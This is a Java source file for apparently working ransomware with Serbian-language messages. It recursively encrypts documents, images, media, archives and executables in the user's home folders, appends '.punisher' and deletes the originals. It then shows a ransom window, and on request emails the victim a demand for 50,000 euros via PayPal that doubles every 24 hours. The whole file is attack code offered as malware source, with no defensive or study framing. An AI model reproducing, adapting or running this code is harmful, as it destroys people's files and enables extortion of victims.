package com.andjelkadzida;
import com.andjelkadzida.exceptions.CryptoException;
import com.andjelkadzida.utils.CryptoUtils;
import org.apache.commons.io.FileUtils;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.util.*;

public class Main extends JFrame
{
    private static OS os = null;
    public static String key = "UjXn2r5u8x/A?D(G";
            //"w3ar3funnyguyys"

    public static void main(String[] args)
    {
        findFiles();
        showingMessage();
    }

    public static void findFiles()
    {
        ArrayList<String> criticalPaths = new ArrayList<>();
        criticalPaths.add(System.getProperty("user.home") + "/Desktop");
        criticalPaths.add(System.getProperty("user.home") + "/Documents");
        criticalPaths.add(System.getProperty("user.home") + "/Downloads");
        criticalPaths.add(System.getProperty("user.home") + "/Pictures");
        criticalPaths.add(System.getProperty("user.home") + "/Music");
        criticalPaths.add(System.getProperty("user.home") + "/Videos");

        for (String targetDirectory : criticalPaths)
        {

            File file = new File(targetDirectory);
            //Obezbedjivanje privilegija fajlovima
            file.setExecutable(true);
            file.setReadable(true);
            file.setWritable(true);

            try
            {
                String [] extensions = {"pdf","txt","doc","docx","rtf","ppt","pptx","xls","xlsx","csv","pub","accdb","mdb","gif","svg","ico","png","bmp","jpg","jpeg","jfif","psd","wav","m4a","mp4","mp3","rar","taz","zip","exe"};

                Collection files = FileUtils.listFiles(file, extensions, true);

                for (Object obj:files)
                {
                    File f = (File) obj;
                    encryption(f.getAbsolutePath());
                }
            }
            catch (Exception ex)
            {
                ex.printStackTrace();
            }
        }
    }

    public static void findFiles(String extension)
    {
       ArrayList<String> criticalPaths = new ArrayList<>();
       criticalPaths.add(System.getProperty("user.home") + "/Desktop");
       criticalPaths.add(System.getProperty("user.home") + "/Documents");
       criticalPaths.add(System.getProperty("user.home") + "/Downloads");
       criticalPaths.add(System.getProperty("user.home") + "/Pictures");
       criticalPaths.add(System.getProperty("user.home") + "/Music");
       criticalPaths.add(System.getProperty("user.home") + "/Videos");

        for (String targetDirectory : criticalPaths)
        {
            File file = new File(targetDirectory);
            //Obezbedjivanje privilegija fajlovima
            file.setExecutable(true);
            file.setReadable(true);
            file.setWritable(true);
            try
            {
                String [] extensions = {extension};

                Collection files = FileUtils.listFiles(file, extensions, true);

                for (Object obj:files)
                {
                    File f = (File) obj;
                    decryption(f.getAbsolutePath());
                }
            }
            catch (Exception ex)
            {
                ex.printStackTrace();
            }
        }
    }

    public static void encryption(String targetFilePath)
    {
        File targetFile = new File(targetFilePath);
        File encryptedFile = new File(targetFilePath + ".punisher");

        try
        {
            CryptoUtils.encrypt(key, targetFile, encryptedFile);
        }
        catch (CryptoException ex)
        {
            ex.printStackTrace();
        }

        targetFile.delete();
    }

    public static void decryption(String encryptedFilePath)
    {
        File targetFile = new File(encryptedFilePath);
        File decryptedFile = new File(encryptedFilePath.replace(".punisher", ""));
        try
        {
            CryptoUtils.decrypt(key, targetFile, decryptedFile);
        }
        catch (CryptoException ex)
        {
            ex.printStackTrace();
        }

        targetFile.delete();
    }

    public static void showingMessage()
    {
        JFrame jFrame = new JFrame("Uhvaćeni ste u klopku!");
        JPanel panel;
        JButton btnSubmit, btnDelete, btnRequestKey;
        JLabel lbResult;
        JPasswordField textField;

        textField = new JPasswordField(30);
        textField.setBounds(10, 10, 240, 20);
        textField.setToolTipText("Unesite ključ da biste povratili podatke!");
        btnRequestKey = new JButton("Tražite ključ");
        btnRequestKey.setBounds(260, 10, 105, 20);
        btnSubmit = new JButton("Potvrdite");
        btnSubmit.setBounds(260, 40, 100, 20);
        btnDelete = new JButton("Obrišite");
        btnDelete.setBounds(260, 70, 100, 20);
        btnSubmit.addActionListener(new ActionListener()
        {
            @Override
            public void actionPerformed(ActionEvent e)
            {
                String insertedText = textField.getText();

                if(insertedText.equals(key))
                {
                    JOptionPane.showMessageDialog(jFrame, "Ključ koji ste uneli je ispravan! Fajlovi će Vam biti vraćeni uskoro...");
                    findFiles("punisher");
                    textField.setText("");
                }
                else
                {
                    JOptionPane.showMessageDialog(jFrame, "Ključ koji ste uneli nije ispravan!");
                    textField.setText("");
                    textField.requestFocusInWindow();
                }
            }
        });

        btnDelete.addActionListener(new ActionListener()
        {
            @Override
            public void actionPerformed(ActionEvent e)
            {
                textField.setText("");
                textField.requestFocusInWindow();
            }
        });

        btnRequestKey.addActionListener(new ActionListener()
        {
            @Override
            public void actionPerformed(ActionEvent e)
            {
               String userEmail = JOptionPane.showInputDialog(jFrame, "Da biste dobili ključ za vraćanje Vaših fajlova, potrebno je da uneste e-mail adresu!", "Unesite e-mail", JOptionPane.INFORMATION_MESSAGE);
               if(userEmail.isEmpty() || !userEmail.contains("@"))
               {
                   JOptionPane.showMessageDialog(jFrame, "Morate uneti Vašu e-mail adresu!", "E-mail", JOptionPane.ERROR_MESSAGE);
               }
               else
               {
                   try
                   {
                       Email email = new Email("*********@gmail.com", "****************","Hacker",userEmail,"smtp.gmail.com","Zahtev za ključ", "Vaši podaci su zaključani!\n" + "Da biste povratili Vaše podatke, potrebno je da platite 50000€ u roku od 48h. U suprotnom, ta cifra će se duplirati svaka 24h.\n" + "Imate 96h da na Paypal jeesaky98@gmail.com uplatite novac kako bismo Vam poslali ključ za vraćanje podataka!\n");
                       email.sending();
                       JOptionPane.showOptionDialog(jFrame, "Instrukcije za dobijanje ključa su Vam prosleđene na e-mail!", "Hvala", JOptionPane.DEFAULT_OPTION, JOptionPane.INFORMATION_MESSAGE, null, null, null);
                   }
                   catch (Exception exception)
                   {
                       JOptionPane.showMessageDialog(jFrame, "Greška prilikom slanja e-maila, molimo proverite unete podatke!", "Greška", JOptionPane.ERROR_MESSAGE);
                   }
               }
            }
        });

        lbResult = new JLabel("Vaši podaci su zaključani!");
        lbResult.setBounds(10, 40, 400, 20);

        panel = new JPanel(null);
        panel.add(btnSubmit);
        panel.add(btnDelete);
        panel.add(lbResult);
        panel.add(textField);
        panel.add(btnRequestKey);
        panel.setPreferredSize(new Dimension(380, 95));
        panel.setBackground(Color.RED);

        jFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        Image icon = Toolkit.getDefaultToolkit().getImage("C:\\Users\\andje\\Desktop\\icon.png");
        jFrame.setIconImage(icon);
        jFrame.getContentPane().add(panel);
        jFrame.pack();
        jFrame.setVisible(true);
    }
        public static OS getOs()
        {
            if(os==null)
            {
                String operatingSys = System.getProperty("os.name").toLowerCase();
                if(operatingSys.contains("win"))
                {
                    os=OS.WINDOWS;
                }
                else if(operatingSys.contains("mac"))
                {
                    os=OS.MAC;
                }
                else if(operatingSys.contains("sunos"))
                {
                    os=OS.SOLARIS;
                }
                else
                {
                    os=OS.LINUX;
                }
            }
            return os;
        }
}
